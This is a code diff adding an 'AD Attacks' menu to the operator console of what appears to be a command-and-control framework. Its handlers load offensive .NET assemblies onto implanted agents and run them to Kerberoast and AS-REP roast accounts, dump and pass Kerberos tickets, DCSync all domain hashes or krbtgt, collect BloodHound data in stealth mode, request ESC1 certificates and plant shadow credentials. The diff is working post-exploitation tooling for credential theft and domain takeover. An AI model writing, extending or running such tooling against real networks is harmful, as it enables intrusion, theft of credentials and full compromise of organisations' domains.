@@ -2878,6 +2878,179 @@ async function runCtxAction(act) {
       }
       break;
     }
+    // ── AD Attacks ──────────────────────────────────────────────────────────
+
+    // Rubeus — Kerberos abuse
+    case 'rubeusKerberoast': {
+      const aid = act.id || activeAgent?.id; if (!aid) break;
+      const domain = act.domain || '';
+      const args = ['kerberoast', '/nowrap', domain ? `/domain:${domain}` : ''].filter(Boolean).join(' ');
+      runDotnetExec(aid, 'Rubeus.exe', args, `Rubeus kerberoast${domain?' /domain:'+domain:''}`);
+      break;
+    }
+    case 'rubeusASREP': {
+      const aid = act.id || activeAgent?.id; if (!aid) break;
+      const domain = act.domain || '';
+      const args = ['asreproast', '/nowrap', domain ? `/domain:${domain}` : ''].filter(Boolean).join(' ');
+      runDotnetExec(aid, 'Rubeus.exe', args, `Rubeus asreproast`);
+      break;
+    }
+    case 'rubeusDump': {
+      const aid = act.id || activeAgent?.id; if (!aid) break;
+      runDotnetExec(aid, 'Rubeus.exe', 'dump /nowrap', 'Rubeus dump tickets');
+      break;
+    }
+    case 'rubeusPTT': {
+      const aid = act.id || activeAgent?.id; if (!aid) break;
+      showPrompt('Pass-the-Ticket', 'Base64 ticket (from Rubeus dump or /ticket:…)', '', ticket => {
+        runDotnetExec(aid, 'Rubeus.exe', `ptt /ticket:${ticket}`, 'Rubeus PTT');
+      });
+      break;
+    }
+    case 'rubeusTGTDeleg': {
+      const aid = act.id || activeAgent?.id; if (!aid) break;
+      runDotnetExec(aid, 'Rubeus.exe', 'tgtdeleg /nowrap', 'Rubeus tgtdeleg (usable TGT without admin)');
+      break;
+    }
+    case 'rubeusCustom': {
+      const aid = act.id || activeAgent?.id; if (!aid) break;
+      showPrompt('Rubeus — custom command', 'Arguments (e.g. s4u /user:svc /rc4:hash /impersonateuser:admin /msdsspn:cifs/dc.lab.local /ptt)', 'kerberoast /nowrap', rubeusArgs => {
+        runDotnetExec(aid, 'Rubeus.exe', rubeusArgs, `Rubeus ${rubeusArgs.split(' ')[0]}`);
+      });
+      break;
+    }
+
+    // DCSync via SharpKatz / Mimikatz
+    case 'dcsyncAll': {
+      const aid = act.id || activeAgent?.id; if (!aid) break;
+      showPrompt('DCSync — all hashes', 'Domain (e.g. lab.local)', '', domain => {
+        // Try SharpKatz first, fallback label mentions Mimikatz as alternative
+        const args = `dcsync --Domain ${domain} --DomainController dc.${domain} --AuthType negotiate`;
+        runDotnetExec(aid, 'SharpKatz.exe', args, `DCSync all @ ${domain}`);
+      });
+      break;
+    }
+    case 'dcsyncUser': {
+      const aid = act.id || activeAgent?.id; if (!aid) break;
+      showQuickForm('DCSync — target user', [
+        {key:'domain', label:'Domain',          ph:'lab.local',       def:''},
+        {key:'user',   label:'User (or krbtgt)',ph:'Administrator',   def:''},
+      ], vals => {
+        if (!vals.domain || !vals.user) { toast('Domain and user required', 'red'); return; }
+        const args = `dcsync --Domain ${vals.domain} --User ${vals.user} --AuthType negotiate`;
+        runDotnetExec(aid, 'SharpKatz.exe', args, `DCSync ${vals.user}@${vals.domain}`);
+      });
+      break;
+    }
+
+    // BloodHound / SharpHound collection
+    case 'bloodhoundCollect': {
+      const aid = act.id || activeAgent?.id; if (!aid) break;
+      const method = act.method || 'All';
+      const stealth = act.stealth || false;
+      const stealthFlag = stealth ? ' --Stealth' : '';
+      const ldapFlag = method === 'DCOnly' ? ' --DCOnly' : '';
+      const args = `-c ${method}${stealthFlag}${ldapFlag} --ZipFileName bh_${method.toLowerCase()}.zip`;
+      runDotnetExec(aid, 'SharpHound.exe', args, `SharpHound -c ${method}`);
+      break;
+    }
+    case 'bloodhoundCustom': {
+      const aid = act.id || activeAgent?.id; if (!aid) break;
+      showQuickForm('SharpHound', [
+        {key:'collection', label:'Collection method', type:'select', options:[
+          {v:'All',     l:'All (default)'},
+          {v:'Session', l:'Session (stealthy)'},
+          {v:'DCOnly',  l:'DCOnly (no host scan)'},
+          {v:'Default', l:'Default'},
+        ], def:'All'},
+        {key:'domain',   label:'Domain (blank = current)', ph:'lab.local',   def:''},
+        {key:'ldapuser', label:'LDAP user (blank = current)', ph:'user',     def:''},
+        {key:'ldappass', label:'LDAP password',             ph:'',           def:''},
+        {key:'stealth',  label:'Stealth mode',    type:'checkbox', def:false},
+      ], vals => {
+        const parts = [`-c ${vals.collection}`, '--ZipFileName bh_out.zip'];
+        if (vals.domain)   parts.push(`--Domain ${vals.domain}`);
+        if (vals.ldapuser) parts.push(`--LDAPUser ${vals.ldapuser}`);
+        if (vals.ldappass) parts.push(`--LDAPPass ${vals.ldappass}`);
+        if (vals.stealth)  parts.push('--Stealth');
+        runDotnetExec(aid, 'SharpHound.exe', parts.join(' '), `SharpHound -c ${vals.collection}`);
+      });
+      break;
+    }
+
+    // Certify — ADCS
+    case 'certifyFind': {
+      const aid = act.id || activeAgent?.id; if (!aid) break;
+      const vuln = act.vulnerable !== false;
+      const args = vuln ? 'find /vulnerable /currentuser' : 'find';
+      runDotnetExec(aid, 'Certify.exe', args, `Certify ${args.split(' ')[0]}${vuln?' (vulnerable only)':''}`);
+      break;
+    }
+    case 'certifyCAs': {
+      const aid = act.id || activeAgent?.id; if (!aid) break;
+      runDotnetExec(aid, 'Certify.exe', 'cas', 'Certify — enumerate CAs');
+      break;
+    }
+    case 'certifyRequest': {
+      const aid = act.id || activeAgent?.id; if (!aid) break;
+      showQuickForm('Certify — Request Certificate', [
+        {key:'ca',       label:'CA (e.g. dc.lab.local\\lab-DC-CA)',  ph:'dc.lab.local\\lab-DC-CA', def:''},
+        {key:'template', label:'Template name',                       ph:'User',                    def:'User'},
+        {key:'altname',  label:'Alt name (for ESC1 — leave blank if not needed)', ph:'Administrator', def:''},
+        {key:'domain',   label:'Domain',                              ph:'lab.local',               def:''},
+      ], vals => {
+        if (!vals.ca || !vals.template) { toast('CA and template required', 'red'); return; }
+        const parts = [`request /ca:${vals.ca}`, `/template:${vals.template}`];
+        if (vals.altname) parts.push(`/altname:${vals.altname}`);
+        if (vals.domain)  parts.push(`/domain:${vals.domain}`);
+        runDotnetExec(aid, 'Certify.exe', parts.join(' '), `Certify request ${vals.template}`);
+      });
+      break;
+    }
+    case 'certifyCustom': {
+      const aid = act.id || activeAgent?.id; if (!aid) break;
+      showPrompt('Certify — custom', 'Arguments', 'find /vulnerable', certArgs => {
+        runDotnetExec(aid, 'Certify.exe', certArgs, `Certify ${certArgs.split(' ')[0]}`);
+      });
+      break;
+    }
+
+    // Whisker — Shadow Credentials
+    case 'whiskerOp': {
+      const aid = act.id || activeAgent?.id; if (!aid) break;
+      const op = act.op;
+      if (op === 'list') {
+        showPrompt('Whisker — List Shadow Creds', 'Target user (sAMAccountName)', '', target => {
+          runDotnetExec(aid, 'Whisker.exe', `list /target:${target}`, `Whisker list ${target}`);
+        });
+      } else if (op === 'add') {
+        showQuickForm('Whisker — Add Shadow Credential', [
+          {key:'target', label:'Target user (sAMAccountName)', ph:'svc_sql',     def:''},
+          {key:'domain', label:'Domain',                        ph:'lab.local',  def:''},
+          {key:'dc',     label:'Domain Controller IP/hostname', ph:'dc.lab.local', def:''},
+        ], vals => {
+          if (!vals.target) { toast('Target required', 'red'); return; }
+          const parts = [`add /target:${vals.target}`];
+          if (vals.domain) parts.push(`/domain:${vals.domain}`);
+          if (vals.dc)     parts.push(`/dc:${vals.dc}`);
+          runDotnetExec(aid, 'Whisker.exe', parts.join(' '), `Whisker add → ${vals.target}`);
+        });
+      } else if (op === 'remove') {
+        showQuickForm('Whisker — Remove Shadow Credential', [
+          {key:'target',   label:'Target user',  ph:'svc_sql',  def:''},
+          {key:'deviceid', label:'Device ID (from Whisker list)', ph:'', def:''},
+        ], vals => {
+          if (!vals.target || !vals.deviceid) { toast('Target and Device ID required', 'red'); return; }
+          runDotnetExec(aid, 'Whisker.exe', `remove /target:${vals.target} /deviceid:${vals.deviceid}`, `Whisker remove ${vals.target}`);
+        });
+      } else if (op === 'clear') {
+        showPrompt('Whisker — Clear all shadow creds', 'Target user', '', target => {
+          runDotnetExec(aid, 'Whisker.exe', `clear /target:${target}`, `Whisker clear ${target}`);
+        });
+      }
+      break;
+    }
+
     case 'injectModal':      openInjectModal(act.id, act.mode, act.pid); break;
     case 'screenshotToLoot': {
       const aid = act.id;
@@ -3478,6 +3651,42 @@ function agentContextMenu(e, agentId) {
       null,
       {label:'Hook Check (EDR)',           action:{fn:'selectAndTask', id, type:'HOOK_CHECK',  args:''}},
       {label:'HW Breakpoint Check',        action:{fn:'selectAndTask', id, type:'HW_BP_CHECK', args:''}},
+    ]},
+    {_sub:'🔑  AD Attacks', items:[
+      {_sub:'🎫  Rubeus (Kerberos)', items:[
+        {label:'Kerberoast — TGS hashes (all SPNs)',  action:{fn:'rubeusKerberoast', id}},
+        {label:'AS-REP Roast — no-preauth users',     action:{fn:'rubeusASREP',      id}},
+        {label:'Dump — list current tickets',         action:{fn:'rubeusDump',       id}},
+        {label:'TGT Deleg — usable TGT (no admin)',   action:{fn:'rubeusTGTDeleg',   id}},
+        null,
+        {label:'Pass-the-Ticket…',                    action:{fn:'rubeusPTT',        id}},
+        {label:'Custom Rubeus command…',              action:{fn:'rubeusCustom',     id}},
+      ]},
+      {_sub:'🩸  DCSync (SharpKatz)', items:[
+        {label:'DCSync — all hashes…',         action:{fn:'dcsyncAll',  id}},
+        {label:'DCSync — target user/krbtgt…', action:{fn:'dcsyncUser', id}},
+      ]},
+      {_sub:'🐺  BloodHound (SharpHound)', items:[
+        {label:'Collect All',           action:{fn:'bloodhoundCollect', id, method:'All'}},
+        {label:'Collect Session only (stealthy)', action:{fn:'bloodhoundCollect', id, method:'Session', stealth:true}},
+        {label:'Collect DC only',       action:{fn:'bloodhoundCollect', id, method:'DCOnly'}},
+        null,
+        {label:'Custom collection…',    action:{fn:'bloodhoundCustom', id}},
+      ]},
+      {_sub:'📜  ADCS (Certify)', items:[
+        {label:'Find vulnerable templates',   action:{fn:'certifyFind', id, vulnerable:true}},
+        {label:'Find all templates',          action:{fn:'certifyFind', id, vulnerable:false}},
+        {label:'Enumerate CAs',               action:{fn:'certifyCAs',  id}},
+        null,
+        {label:'Request certificate (ESC1)…', action:{fn:'certifyRequest', id}},
+        {label:'Custom Certify command…',     action:{fn:'certifyCustom', id}},
+      ]},
+      {_sub:'👻  Shadow Creds (Whisker)', items:[
+        {label:'List shadow creds…',   action:{fn:'whiskerOp', id, op:'list'}},
+        {label:'Add shadow cred…',     action:{fn:'whiskerOp', id, op:'add'}},
+        {label:'Remove shadow cred…',  action:{fn:'whiskerOp', id, op:'remove'}},
+        {label:'Clear all…',           action:{fn:'whiskerOp', id, op:'clear'}},
+      ]},
     ]},
     {_sub:'🔎  File Search', items:[
       {label:'🔑  Sensitive files (kdbx/pfx/key)', action:{fn:'searchFiles', id, pattern:'*.kdbx *.pfx *.pem *.key id_rsa *.p12'}},
@@ -8291,6 +8500,32 @@ async function fetchSCFile(name) {
     if (r.ok) return new Uint8Array(await r.arrayBuffer());
   }
   throw new Error(`File not found: ${name} (not in uploads nor in payloads)`);
+}
+
+// ── AD attack helper — fetch .NET assembly and queue DOTNET_EXEC ──────────────
+// Returns the task_id on success, null on failure.
+async function runDotnetExec(agentID, toolName, toolArgs, label) {
+  const lbl = label || `${toolName} ${toolArgs}`.trim();
+  addConsoleOutputForAgent(agentID, `[*] ${lbl}…`, '', null);
+  let asmBytes;
+  try {
+    asmBytes = await fetchSCFile(toolName);
+  } catch(_) {
+    const msg = `${toolName} not found — upload it to Tools/Uploads first`;
+    toast(msg, 'red');
+    addConsoleOutputForAgent(agentID, '', msg, null);
+    return null;
+  }
+  const b64 = u8ToB64(new Uint8Array(asmBytes));
+  const r = await api('POST', `/api/agents/${agentID}/task`, {
+    type: 'DOTNET_EXEC',
+    args: JSON.stringify({asm: b64, args: toolArgs, type: '', method: ''}),
+  });
+  if (!r?.ok) { toast(`Failed to queue ${lbl}`, 'red'); return null; }
+  const tid = r.data?.task_id;
+  addConsoleOutputForAgent(agentID, `[+] ${lbl} → task #${tid}`, '', null);
+  if (tid) pollResult(tid, agentID);
+  return tid;
 }
 
 async function dispatchConsoleCmd(agentID, cmdLine) {
